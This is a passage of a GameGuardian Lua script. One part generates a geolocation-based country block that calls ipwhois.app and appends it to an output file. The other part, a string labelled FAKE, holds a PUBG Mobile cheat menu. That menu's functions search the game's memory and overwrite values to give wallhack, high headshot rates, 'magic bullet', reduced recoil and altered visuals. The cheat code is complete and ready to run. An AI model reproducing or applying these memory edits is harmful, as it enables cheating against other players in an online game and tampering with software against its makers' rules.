    PM = "SAINT PIERRE AND MIQUELON",
    VC = "SAINT VINCENT AND THE GRENADINES",
    WS = "SAMOA",
    SM = "SAN MARINO",
    ST = "SAO TOME AND PRINCIPE",
    SA = "SAUDI ARABIA",
    SN = "SENEGAL",
    RS = "SERBIA",
    SC = "SEYCHELLES",
    SL = "SIERRA LEONE",
    SG = "SINGAPORE",
    SX = "SINT MAARTEN",
    SK = "SLOVAKIA",
    SI = "SLOVENIA",
    SB = "SOLOMON ISLANDS",
    SO = "SOMALIA",
    ZA = "SOUTH AFRICA",
    GS = "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS",
    SS = "SOUTH SUDAN",
    ES = "SPAIN",
    LK = "SRI LANKA",
    SD = "SUDAN",
    SR = "SURINAME",
    SZ = "SWAZILAND",
    SE = "SWEDEN",
    CH = "SWITZERLAND",
    SY = "SYRIAN ARAB REPUBLIC",
    TW = "TAIWAN",
    TJ = "TAJIKISTAN",
    TZ = "TANZANIA",
    TH = "THAILAND",
    TL = "TIMOR-LESTE",
    TG = "TOGO",
    TK = "TOKELAU",
    TO = "TONGA",
    TT = "TRINIDAD AND TOBAGO",
    TN = "TUNISIA",
    TR = "TURKEY",
    TM = "TURKMENISTAN",
    TC = "TURKS AND CAICOS ISLANDS",
    TV = "TUVALU",
    UG = "UGANDA",
    UA = "UKRAINE",
    AE = "UNITED ARAB EMIRATES",
    GB = "UNITED KINGDOM",
    US = "UNITED STATES",
    UY = "URUGUAY",
    UZ = "UZBEKISTAN",
    VU = "VANUATU",
    VE = "VENEZUELA",
    VN = "VIETNAM",
    VG = "VIRGIN ISLANDS, BRITISH",
    VI = "VIRGIN ISLANDS, U.S.",
    WF = "WALLIS AND FUTUNA",
    EH = "WESTERN SAHARA",
    YE = "YEMEN",
    ZM = "ZAMBIA",
    ZW = "ZIMBABWE"
}
    local sph = gg.prompt({
 "AFGHANISTAN",
"ALBANIA",
"ALGERIA",
"AMERICAN SAMOA",
"ANDORRA",
"ANGOLA",
"ANGUILLA",
"ANTIGUA AND BARBUDA",
"ARGENTINA",
"ARMENIA",
"ARUBA",
"AUSTRALIA",
"AUSTRIA",
"AZERBAIJAN",
"BAHAMAS",
"BAHRAIN",
"BANGLADESH",
"BARBADOS",
"BELARUS",
"BELGIUM",
"BELIZE",
"BENIN",
"BERMUDA",
"BHUTAN",
"BOLIVIA",
"BOSNIA AND HERZEGOVINA",
"BOTSWANA",
"BOUVET ISLAND",
"BRAZIL",
"BRITISH INDIAN OCEAN TERRITORY",
"BRUNEI DARUSSALAM",
"BULGARIA",
"BURKINA FASO",
"BURUNDI",
"CAMBODIA",
"CAMEROON",
"CANADA",
"CAPE VERDE",
"CAYMAN ISLANDS",
"CENTRAL AFRICAN REPUBLIC",
"CHAD",
"CHILE",
"CHINA",
"CHRISTMAS ISLAND",
"COCOS (KEELING) ISLANDS",
"COLOMBIA",
"COMOROS",
"CONGO",
"CONGO, DEMOCRATIC REPUBLIC OF THE",
"COOK ISLANDS",
"COSTA RICA",
"COTE D'IVOIRE",
"CROATIA",
"CUBA",
"CURACAO",
"CYPRUS",
"CZECH REPUBLIC",
"DENMARK",
"DJIBOUTI",
"DOMINICA",
"DOMINICAN REPUBLIC",
"ECUADOR",
"EGYPT",
"EL SALVADOR",
"EQUATORIAL GUINEA",
"ERITREA",
"ESTONIA",
"ETHIOPIA",
"FALKLAND ISLANDS",
"FAROE ISLANDS",
"FIJI",
"FINLAND",
"FRANCE",
"FRENCH GUIANA",
"FRENCH POLYNESIA",
"FRENCH SOUTHERN TERRITORIES",
"GABON",
"GAMBIA",
"GEORGIA",
"GERMANY",
"GHANA",
"GIBRALTAR",
"GREECE",
"GREENLAND",
"GRENADA",
"GUADELOUPE",
"GUAM",
"GUATEMALA",
"GUERNSEY",
"GUINEA",
"GUINEA-BISSAU",
"GUYANA",
"HAITI",
"HEARD ISLAND AND MCDONALD ISLANDS",
"HOLY SEE",
"HONDURAS",
"HONG KONG",
"HUNGARY",
"ICELAND",
"INDIA",
"INDONESIA",
"IRAN",
"IRAQ",
"IRELAND",
"ISLE OF MAN",
"ISRAEL",
"ITALY",
"JAMAICA",
"JAPAN",
"JERSEY",
"JORDAN",
"KAZAKHSTAN",
"KENYA",
"KIRIBATI",
"KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF",
"KOREA, REPUBLIC OF",
"KUWAIT",
"KYRGYZSTAN",
"LAO PEOPLE'S DEMOCRATIC REPUBLIC",
"LATVIA",
"LEBANON",
"LESOTHO",
"LIBERIA",
"LIBYA",
"LIECHTENSTEIN",
"LITHUANIA",
"LUXEMBOURG",
"MACAO",
"MACEDONIA",
"MADAGASCAR",
"MALAWI",
"MALAYSIA",
"MALDIVES",
"MALI",
"MALTA",
"MARSHALL ISLANDS",
"MAURITANIA",
"MAURITIUS",
"MAYOTTE",
"MEXICO",
"MICRONESIA",
"MOLDOVA",
"MONACO",
"MONGOLIA",
"MONTENEGRO",
"MONTSERRAT",
"MOROCCO",
"MOZAMBIQUE",
"MYANMAR",
"NAMIBIA",
"NAURU",
"NEPAL",
"NETHERLANDS",
"NEW CALEDONIA",
"NEW ZEALAND",
"NICARAGUA",
"NIGER",
"NIGERIA",
"NIUE",
"NORFOLK ISLAND",
"NORTHERN MARIANA ISLANDS",
"NORWAY",
"OMAN",
"PAKISTAN",
"PALAU",
"PALESTINE",
"PANAMA",
"PAPUA NEW GUINEA",
"PARAGUAY",
"PERU",
"PHILIPPINES",
"PITCAIRN",
"POLAND",
"PORTUGAL",
"PUERTO RICO",
"QATAR",
"REUNION",
"ROMANIA",
"RUSSIA",
"RWANDA",
"SAINT BARTHÉLEMY",
"SAINT HELENA",
"SAINT KITTS AND NEVIS",
"SAINT LUCIA",
"SAINT MARTIN",
"SAINT PIERRE AND MIQUELON",
"SAINT VINCENT AND THE GRENADINES",
"SAMOA",
"SAN MARINO",
"SAO TOME AND PRINCIPE",
"SAUDI ARABIA",
"SENEGAL",
"SERBIA",
"SEYCHELLES",
"SIERRA LEONE",
"SINGAPORE",
"SINT MAARTEN",
"SLOVAKIA",
"SLOVENIA",
"SOLOMON ISLANDS",
"SOMALIA",
"SOUTH AFRICA",
"SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS",
"SOUTH SUDAN",
"SPAIN",
"SRI LANKA",
"SUDAN",
"SURINAME",
"SWAZILAND",
"SWEDEN",
"SWITZERLAND",
"SYRIAN ARAB REPUBLIC",
"TAIWAN",
"TAJIKISTAN",
"TANZANIA",
"THAILAND",
"TIMOR-LESTE",
"TOGO",
"TOKELAU",
"TONGA",
"TRINIDAD AND TOBAGO",
"TUNISIA",
"TURKEY",
"TURKMENISTAN",
"TURKS AND CAICOS ISLANDS",
"TUVALU",
"UGANDA",
"UKRAINE",
"UNITED ARAB EMIRATES",
"UNITED KINGDOM",
"UNITED STATES",
"URUGUAY",
"UZBEKISTAN",
"VANUATU",
"VENEZUELA",
"VIETNAM",
"VIRGIN ISLANDS, BRITISH",
"VIRGIN ISLANDS, U.S.",
"WALLIS AND FUTUNA",
"WESTERN SAHARA",
 "YEMEN",
 "ZAMBIA",
 "ZIMBABWE"
    }, {false}  , {"checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", 
     "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox", "checkbox","checkbox", "checkbox"})

    if sph == nil then
        return
    else
        local block_country_codes = {}

            local country_codes = {
            "AF", "AL", "DZ", "AS", "AD", "AO", "AI", "AG", "AR", "AM", "AW", "AU",
"AT", "AZ", "BS", "BH", "BD", "BB", "BY", "BE", "BZ", "BJ", "BM", "BT",
"BO", "BA", "BW", "BV", "BR", "IO", "BN", "BG", "BF", "BI", "KH", "CM",
"CA", "CV", "KY", "CF", "TD", "CL", "CN", "CX", "CC", "CO", "KM", "CG",
"CD", "CK", "CR", "CI", "HR", "CU", "CW", "CY", "CZ", "DK", "DJ", "DM",
"DO", "EC", "EG", "SV", "GQ", "ER", "EE", "ET", "FK", "FO", "FJ", "FI",
"FR", "GF", "PF", "TF", "GA", "GM", "GE", "DE", "GH", "GI", "GR", "GL",
"GD", "GP", "GU", "GT", "GG", "GN", "GW", "GY", "HT", "HM", "VA", "HN",
"HK", "HU", "IS", "IN", "ID", "IR", "IQ", "IE", "IM", "IL", "IT", "JM",
"JP", "JE", "JO", "KZ", "KE", "KI", "KP", "KR", "KW", "KG", "LA", "LV",
"LB", "LS", "LR", "LY", "LI", "LT", "LU", "MO", "MK", "MG", "MW", "MY",
"MV", "ML", "MT", "MH", "MR", "MU", "YT", "MX", "FM", "MD", "MC", "MN",
"ME", "MS", "MA", "MZ", "MM", "NA", "NR", "NP", "NL", "NC", "NZ", "NI",
"NE", "NG", "NU", "NF", "MP", "NO", "OM", "PK", "PW", "PS", "PA", "PG",
"PY", "PE", "PH", "PN", "PL", "PT", "PR", "QA", "RE", "RO", "RU", "RW",
"BL", "SH", "KN", "LC", "MF", "PM", "VC", "WS", "SM", "ST", "SA", "SN",
"RS", "SC", "SL", "SG", "SX", "SK", "SI", "SB", "SO", "ZA", "GS", "SS",
"ES", "LK", "SD", "SR", "SZ", "SE", "CH", "SY", "TW", "TJ", "TZ", "TH",
"TL", "TG", "TK", "TO", "TT", "TN", "TR", "TM", "TC", "TV", "UG", "UA",
"AE", "GB", "US", "UY", "UZ", "VU", "VE", "VN", "VG", "VI", "WF", "EH",
"YE", "ZM", "ZW"
        }

        for i, selected in ipairs(sph) do
            if selected then
                table.insert(block_country_codes, country_codes[i])
            end
        end

        local VB = [[
                
        local country_language_map = {
    AF = "AFGHANISTAN",
    AL = "ALBANIA",
    DZ = "ALGERIA",
    AS = "AMERICAN SAMOA",
    AD = "ANDORRA",
    AO = "ANGOLA",
    AI = "ANGUILLA",
    AG = "ANTIGUA AND BARBUDA",
    AR = "ARGENTINA",
    AM = "ARMENIA",
    AW = "ARUBA",
    AU = "AUSTRALIA",
    AT = "AUSTRIA",
    AZ = "AZERBAIJAN",
    BS = "BAHAMAS",
    BH = "BAHRAIN",
    BD = "BANGLADESH",
    BB = "BARBADOS",
    BY = "BELARUS",
    BE = "BELGIUM",
    BZ = "BELIZE",
    BJ = "BENIN",
    BM = "BERMUDA",
    BT = "BHUTAN",
    BO = "BOLIVIA",
    BA = "BOSNIA AND HERZEGOVINA",
    BW = "BOTSWANA",
    BV = "BOUVET ISLAND",
    BR = "BRAZIL",
    IO = "BRITISH INDIAN OCEAN TERRITORY",
    BN = "BRUNEI DARUSSALAM",
    BG = "BULGARIA",
    BF = "BURKINA FASO",
    BI = "BURUNDI",
    KH = "CAMBODIA",
    CM = "CAMEROON",
    CA = "CANADA",
    CV = "CAPE VERDE",
    KY = "CAYMAN ISLANDS",
    CF = "CENTRAL AFRICAN REPUBLIC",
    TD = "CHAD",
    CL = "CHILE",
    CN = "CHINA",
    CX = "CHRISTMAS ISLAND",
    CC = "COCOS (KEELING) ISLANDS",
    CO = "COLOMBIA",
    KM = "COMOROS",
    CG = "CONGO",
    CD = "CONGO, DEMOCRATIC REPUBLIC OF THE",
    CK = "COOK ISLANDS",
    CR = "COSTA RICA",
    CI = "COTE D'IVOIRE",
    HR = "CROATIA",
    CU = "CUBA",
    CW = "CURACAO",
    CY = "CYPRUS",
    CZ = "CZECH REPUBLIC",
    DK = "DENMARK",
    DJ = "DJIBOUTI",
    DM = "DOMINICA",
    DO = "DOMINICAN REPUBLIC",
    EC = "ECUADOR",
    EG = "EGYPT",
    SV = "EL SALVADOR",
    GQ = "EQUATORIAL GUINEA",
    ER = "ERITREA",
    EE = "ESTONIA",
    ET = "ETHIOPIA",
    FK = "FALKLAND ISLANDS",
    FO = "FAROE ISLANDS",
    FJ = "FIJI",
    FI = "FINLAND",
    FR = "FRANCE",
    GF = "FRENCH GUIANA",
    PF = "FRENCH POLYNESIA",
    TF = "FRENCH SOUTHERN TERRITORIES",
    GA = "GABON",
    GM = "GAMBIA",
    GE = "GEORGIA",
    DE = "GERMANY",
    GH = "GHANA",
    GI = "GIBRALTAR",
    GR = "GREECE",
    GL = "GREENLAND",
    GD = "GRENADA",
    GP = "GUADELOUPE",
    GU = "GUAM",
    GT = "GUATEMALA",
    GG = "GUERNSEY",
    GN = "GUINEA",
    GW = "GUINEA-BISSAU",
    GY = "GUYANA",
    HT = "HAITI",
    HM = "HEARD ISLAND AND MCDONALD ISLANDS",
    VA = "HOLY SEE",
    HN = "HONDURAS",
    HK = "HONG KONG",
    HU = "HUNGARY",
    IS = "ICELAND",
    IN = "INDIA",
    ID = "INDONESIA",
    IR = "IRAN",
    IQ = "IRAQ",
    IE = "IRELAND",
    IM = "ISLE OF MAN",
    IL = "ISRAEL",
    IT = "ITALY",
    JM = "JAMAICA",
    JP = "JAPAN",
    JE = "JERSEY",
    JO = "JORDAN",
    KZ = "KAZAKHSTAN",
    KE = "KENYA",
    KI = "KIRIBATI",
    KP = "KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF",
    KR = "KOREA, REPUBLIC OF",
    KW = "KUWAIT",
    KG = "KYRGYZSTAN",
    LA = "LAO PEOPLE'S DEMOCRATIC REPUBLIC",
    LV = "LATVIA",
    LB = "LEBANON",
    LS = "LESOTHO",
    LR = "LIBERIA",
    LY = "LIBYA",
    LI = "LIECHTENSTEIN",
    LT = "LITHUANIA",
    LU = "LUXEMBOURG",
    MO = "MACAO",
    MK = "MACEDONIA",
    MG = "MADAGASCAR",
    MW = "MALAWI",
    MY = "MALAYSIA",
    MV = "MALDIVES",
    ML = "MALI",
    MT = "MALTA",
    MH = "MARSHALL ISLANDS",
    MR = "MAURITANIA",
    MU = "MAURITIUS",
    YT = "MAYOTTE",
    MX = "MEXICO",
    FM = "MICRONESIA",
    MD = "MOLDOVA",
    MC = "MONACO",
    MN = "MONGOLIA",
    ME = "MONTENEGRO",
    MS = "MONTSERRAT",
    MA = "MOROCCO",
    MZ = "MOZAMBIQUE",
    MM = "MYANMAR",
    NA = "NAMIBIA",
    NR = "NAURU",
    NP = "NEPAL",
    NL = "NETHERLANDS",
    NC = "NEW CALEDONIA",
    NZ = "NEW ZEALAND",
    NI = "NICARAGUA",
    NE = "NIGER",
    NG = "NIGERIA",
    NU = "NIUE",
    NF = "NORFOLK ISLAND",
    MP = "NORTHERN MARIANA ISLANDS",
    NO = "NORWAY",
    OM = "OMAN",
    PK = "PAKISTAN",
    PW = "PALAU",
    PS = "PALESTINE",
    PA = "PANAMA",
    PG = "PAPUA NEW GUINEA",
    PY = "PARAGUAY",
    PE = "PERU",
    PH = "PHILIPPINES",
    PN = "PITCAIRN",
    PL = "POLAND",
    PT = "PORTUGAL",
    PR = "PUERTO RICO",
    QA = "QATAR",
    RE = "REUNION",
    RO = "ROMANIA",
    RU = "RUSSIA",
    RW = "RWANDA",
    BL = "SAINT BARTHÉLEMY",
    SH = "SAINT HELENA",
    KN = "SAINT KITTS AND NEVIS",
    LC = "SAINT LUCIA",
    MF = "SAINT MARTIN",
    PM = "SAINT PIERRE AND MIQUELON",
    VC = "SAINT VINCENT AND THE GRENADINES",
    WS = "SAMOA",
    SM = "SAN MARINO",
    ST = "SAO TOME AND PRINCIPE",
    SA = "SAUDI ARABIA",
    SN = "SENEGAL",
    RS = "SERBIA",
    SC = "SEYCHELLES",
    SL = "SIERRA LEONE",
    SG = "SINGAPORE",
    SX = "SINT MAARTEN",
    SK = "SLOVAKIA",
    SI = "SLOVENIA",
    SB = "SOLOMON ISLANDS",
    SO = "SOMALIA",
    ZA = "SOUTH AFRICA",
    GS = "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS",
    SS = "SOUTH SUDAN",
    ES = "SPAIN",
    LK = "SRI LANKA",
    SD = "SUDAN",
    SR = "SURINAME",
    SZ = "SWAZILAND",
    SE = "SWEDEN",
    CH = "SWITZERLAND",
    SY = "SYRIAN ARAB REPUBLIC",
    TW = "TAIWAN",
    TJ = "TAJIKISTAN",
    TZ = "TANZANIA",
    TH = "THAILAND",
    TL = "TIMOR-LESTE",
    TG = "TOGO",
    TK = "TOKELAU",
    TO = "TONGA",
    TT = "TRINIDAD AND TOBAGO",
    TN = "TUNISIA",
    TR = "TURKEY",
    TM = "TURKMENISTAN",
    TC = "TURKS AND CAICOS ISLANDS",
    TV = "TUVALU",
    UG = "UGANDA",
    UA = "UKRAINE",
    AE = "UNITED ARAB EMIRATES",
    GB = "UNITED KINGDOM",
    US = "UNITED STATES",
    UY = "URUGUAY",
    UZ = "UZBEKISTAN",
    VU = "VANUATU",
    VE = "VENEZUELA",
    VN = "VIETNAM",
    VG = "VIRGIN ISLANDS, BRITISH",
    VI = "VIRGIN ISLANDS, U.S.",
    WF = "WALLIS AND FUTUNA",
    EH = "WESTERN SAHARA",
    YE = "YEMEN",
    ZM = "ZAMBIA",
    ZW = "ZIMBABWE"
}

local block_country = {
]]

        for _, code in ipairs(block_country_codes) do
            VB = VB .. string.format('    ["%s"] = true,\n', country_language_map[code])
        end

        VB = VB .. [[
}

local function verificarVersaoBloqueada(pais)
    return block_country[pais]
end

local function makeRequest(url)
    local request = gg.makeRequest(url)
    if not request or not request.content then
        print('Error in request.')
        os.exit()
    end
    return request.content
end

local Link = "https://ipwhois.app/json/"
local response = makeRequest(Link)

local function extractCountryCodeFromHTML(html)
    local pattern = '"country_code":"(.-)"'
    return html:match(pattern)
end

local function getCountryNameFromCode(code)
    return country_language_map[code] or "UNKNOWN"
end

local country_code = extractCountryCodeFromHTML(response)

if not country_code then
    print('Error in getting country code.')
    os.exit()
end

local country_name = getCountryNameFromCode(country_code)

if verificarVersaoBloqueada(country_name) then
    gg.alert("this country is blocked.")
    os.exit()
    return 
end
]]
        local file = io.open(g.out, "a")
        if file then
            file:write(VB)
            file:close()
        else
            gg.alert("❌ Error: Could not open file for writing.")
        end
    end
    
end
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 if g.info[21] == true then

FAKE =([[

 function HOME()
    ld = gg.multiChoice({"🔮 MENU Wallhack + Color [ LOBBY ]","♨️ Less Recoil [ LOBBY ]","🔫 Skin Weapon [ LOBBY ]","🤯 MENU HS [ in MATCH/LAND ]","📡 Antena [ in Match/LAND ]","🌌 Black Sky  [ in Match/LAND ]","🖼️ High View [ in Match/LAND ]","       🔙[Exit]🔙     "
},nil,"LONSGHOOT SD845 PUBGM S8\n\n")
    if ld == nil then
    else
      if ld[1] == true then
        Menu()
      end
      if ld[2] == true then
        A()
      end
      if ld[3] == true then
        D()
      end
      if ld[4] == true then
        B()
      end
      if ld[5] == true then
        C()
      end
      if ld[6] == true then
        E()
      end
      if ld[7] == true then
        F()
      end
      if ld[8] == true then
        exit()
      end
    end
    HOMEDM = -1
  end
  function F()
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.clearResults()
    gg.searchNumber("220;178;15 ",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("220",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(300)
    gg.editAll("438",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("High View on")
  end
  function E()
    gg.clearResults()
    gg.setRanges(gg.REGION_BAD)
    gg.searchNumber("100F;1F;1,008,981,770D:99",gg.TYPE_FLOAT,false)
    gg.searchNumber("100",gg.TYPE_FLOAT,false)
    gg.getResults(100)
    gg.editAll("-8200",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("Black Sky On")
  end
  function D()
    gg.toast("Skin Weapon LONGSHOOT SQUAD process")
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("10100100;101001",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("10100100",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("1101001009",gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("20%")
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("10100400;101004",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("10100400",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("1101004061",gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("40%")
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("10100300;101003",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("10100300",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("1101003016",gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("60%")
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("10100200;101002",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("10100200",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("1101002001",gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("80%")
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("10300100;103001",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("10300100",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("1103001042",gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("100% Activated Skin Weapon LONGSHOOT SQUAD")
  end
  function C()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("60,000.0;5.6051939e-45;1.0::77",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("1",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("0",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("18.38613319397;0.53447723389;3.42665576935",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(3)
    gg.editAll("99999",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.searchNumber("0.53446006775F;-1.68741035461F:501",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("-1.68741035461",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(1995)
    gg.editAll("19995",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("Antena On")
  end
  function B()
    hs = gg.multiChoice({"🤯 Headshot 99 + Magicbullet","🤯 Headshot 99 Non MB","🤯 Headshot 50","🤯 Headshot 30","🔙 back 🔙 "
},nil,"MENU HEADSHOT\nUse In Match/Land")
    if hs == nil then
    else
      if hs[1] == true then
        hs1()
      end
      if hs[2] == true then
        hs2()
      end
      if hs[3] == true then
        hs3()
      end
      if hs[4] == true then
        hs4()
      end
      if hs[5] == true then
        HOME()
      end
      DEFAULT = -1
    end
  end
  function hs1()
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("9.20161819458;23;25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResultCount()
    gg.searchNumber("25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("250",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("MB + HS 99 on")
  end
  function hs2()
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("9.20161819458;23;25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResultCount()
    gg.searchNumber("25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("85",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("Headshot 99% On")
  end
  function hs3()
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("9.20161819458;23;25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResultCount()
    gg.searchNumber("25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("60",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("Headshot 50 On")
  end
  function hs4()
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("9.20161819458;23;25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResultCount()
    gg.searchNumber("25;30.5",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(10)
    gg.editAll("40",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("Headshot 30 On")
  end
  function A()
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("1.5584387e28",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("1.5584387e28",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(100)
    gg.editAll("0",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.setRanges(gg.REGION_ANONYMOUS)
    gg.searchNumber("1D;0.05000000075F;0.10000000149F;0.55000001192F;9.5F;15.0F",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("1",gg.TYPE_DWORD,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(100)
    gg.editAll("0",gg.TYPE_DWORD)
    gg.clearResults()
    gg.searchNumber("1,084,227,584D;1D;0.64999997616F;1.2520827e-32F",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.searchNumber("1.2520827e-32",gg.TYPE_FLOAT,false,gg.SIGN_EQUAL,0,-1)
    gg.getResults(100)
    gg.editAll("1.4012985e-43",gg.TYPE_FLOAT)
    gg.clearResults()
    gg.toast("Less Recoil On.")
  end
  function Menu()
    siubo = gg.multiChoice({"🔮 Wallhack [ Lobby ]","💛 Yellow smooth [ Lobby ]","❤️ Red smooth [ Lobby ]","⚪ White smooth [ Lobby ]","       🔙[Back]🔙     "
},nil,"MENU Wallhack + Color SD 845")
    if siubo == nil then
    else
      if siubo[1] == true then
        wh845()
      end
      if siubo[2] == true then
        yellow()
      end
      if siubo[3] == true then
        red()
      end
      if siubo[4] == true then
        white()
      end
      if siubo[5] == true then
        HOME()
      end
      DEFAULT = -1
    end
  end
  function wh845()
    gg.setRanges(131072)
    gg.searchNumber("95D;2;9.2194229e-41",16,false,536870912,0,-1)
    gg.searchNumber("2",16,false,536870912,0,-1)
    gg.getResults(15)
    gg.editAll("130",16)
    gg.clearResults()
    gg.setRanges(131072)
